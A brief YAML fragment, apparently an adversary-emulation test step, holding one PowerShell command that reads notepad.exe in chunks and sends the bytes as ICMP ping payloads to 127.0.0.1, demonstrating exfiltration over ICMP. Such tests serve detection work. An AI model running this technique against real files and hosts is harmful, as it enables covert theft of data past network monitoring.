      psh:
        command: $ping = New-Object System.Net.Networkinformation.ping; foreach($Data
          in Get-Content -Path C:\Windows\System32\notepad.exe -Encoding Byte -ReadCount
          1024) { $ping.Send("127.0.0.1", 1500, $Data) }
